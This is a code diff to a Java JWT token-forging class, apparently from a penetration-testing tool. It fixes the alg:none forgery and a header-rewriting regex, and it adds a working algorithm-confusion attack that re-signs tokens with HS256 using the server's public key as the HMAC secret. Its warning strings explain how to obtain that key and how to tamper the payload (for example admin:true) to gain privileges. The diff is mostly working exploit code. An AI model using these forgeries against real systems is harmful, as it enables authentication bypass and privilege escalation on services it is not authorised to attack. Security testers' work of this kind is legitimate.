@@ -9,7 +9,7 @@ import java.util.List;
 
 /**
  * Author: TK
- * Date: 13-05-2026
+ * Date: 16-11-2026
  * Purpose: Stateless utility that produces forged tokens given an original token
  * plus attack-specific parameters. Each forge method is independent;
  * Callers pick the one matching their attack.
@@ -41,8 +41,9 @@ public class TokenForger {
             String newHeader = replaceAlgInHeader(originalHeader, "none");
             String newHeaderB64 = encodeUrlSafe(newHeader);
 
-            // Payload unchanged, signature empty
-            String forged = newHeaderB64 + "." + parts[1] + ",";
+            // Payload unchanged, signature empty. alg:none tokens end with a
+            // trailing dot and an empty signature segment: header.payload.
+            String forged = newHeaderB64 + "." + parts[1] + ".";
 
             List<String> warnings = List.of(
                     "Succeeds only against servers that accept alg:none.",
@@ -147,6 +148,65 @@ public class TokenForger {
         }
     }
 
+    /**
+     * Algorithm confusion (RS256/ES256 -> HS256).
+     * Re-signs the token with HS256 using the server's PUBLIC key bytes as the
+     * HMAC secret. Works when the server passes an algorithm-agnostic key into a
+     * verify() call, so a verifier expecting RS256 is tricked into running HMAC
+     * with the public key it already trusts. No cracking required.
+     *
+     * @param originalToken  token to base the forgery on
+     * @param publicKeyPem   the server's public key, exactly as the server holds it
+     *                       (usually PEM incl. the -----BEGIN PUBLIC KEY----- lines
+     *                       and a trailing newline)
+     * @param newPayloadJson optional tampered payload JSON; null/empty keeps the original payload
+     */
+    public ForgedToken forgeAlgConfusion(String originalToken, String publicKeyPem, String newPayloadJson) {
+        try {
+            String[] parts = originalToken.split("\\.", -1);
+            if (parts.length < 2) {
+                return ForgedToken.failure(ForgeAttack.ALG_CONFUSION, "Token has fewer than 2 segments");
+            }
+            if (publicKeyPem == null || publicKeyPem.isBlank()) {
+                return ForgedToken.failure(ForgeAttack.ALG_CONFUSION,
+                        "A public key is required. Fetch it from the server's JWKS endpoint, "
+                                + "its TLS certificate, or recover it from two captured tokens.");
+            }
+
+            // Force the header algorithm to HS256 so the server runs HMAC verification.
+            String originalHeader = Base64URL.from(parts[0]).decodeToString();
+            String newHeader = replaceAlgInHeader(originalHeader, "HS256");
+            String newHeaderB64 = encodeUrlSafe(newHeader);
+
+            // Optionally tamper the payload (e.g. flip admin:true); otherwise keep it.
+            String payloadB64 = (newPayloadJson == null || newPayloadJson.isBlank())
+                    ? parts[1]
+                    : encodeUrlSafe(newPayloadJson);
+
+            String signingInput = newHeaderB64 + "." + payloadB64;
+
+            // The public key bytes ARE the HMAC secret. Use them exactly as the
+            // server stores the key — usually the PEM string including the
+            // header/footer lines and a trailing newline.
+            byte[] key = publicKeyPem.getBytes(StandardCharsets.UTF_8);
+            byte[] signature = hmac("HmacSHA256", key,
+                    signingInput.getBytes(StandardCharsets.US_ASCII));
+            String sigB64 = Base64URL.encode(signature).toString();
+
+            String forged = signingInput + "." + sigB64;
+
+            List<String> warnings = List.of(
+                    "Succeeds only when the server verifies with an algorithm-agnostic key and does not pin the algorithm to RS256/ES256.",
+                    "The HMAC key must be the public key in the EXACT byte form the server uses — usually PEM with the BEGIN/END lines and a trailing newline. If it fails, retry with/without the trailing newline, or with the raw base64/DER body.",
+                    "Get the public key from the JWKS endpoint (/.well-known/jwks.json), the TLS certificate, or recover it from two captured tokens (rsa_sign2n).",
+                    "Combine with a tampered payload (e.g. admin:true) to escalate privileges once the confusion is confirmed."
+            );
+            return ForgedToken.success(forged, ForgeAttack.ALG_CONFUSION, warnings);
+        } catch (Exception e) {
+            return ForgedToken.failure(ForgeAttack.ALG_CONFUSION, "Forging failed: " + e.getMessage());
+        }
+    }
+
     // Helpers
 
     private byte[] hmac(String macAlg, byte[] key, byte[] data) throws Exception {
@@ -167,9 +227,11 @@ public class TokenForger {
      * Sufficient for JWT headers which are always shallow flat objects.
      */
     private String replaceAlgInHeader(String headerJson, String newAlg) {
-        // Handles both "alg":"X" and "alg": "X" (with optional space after colon)
+        // Handles both "alg":"X" and "alg": "X" (with optional space around the colon).
+        // NOTE: the ':' in the pattern is required — without it this never matches a
+        // real header and the alg is silently left unchanged.
         return headerJson.replaceAll(
-                "\"alg\"\\s*\"[^\"]*\"",
+                "\"alg\"\\s*:\\s*\"[^\"]*\"",
                 "\"alg\":\"" + newAlg + "\""
         );
     }
@@ -206,3 +268,4 @@ public class TokenForger {
     }
 
 }
+
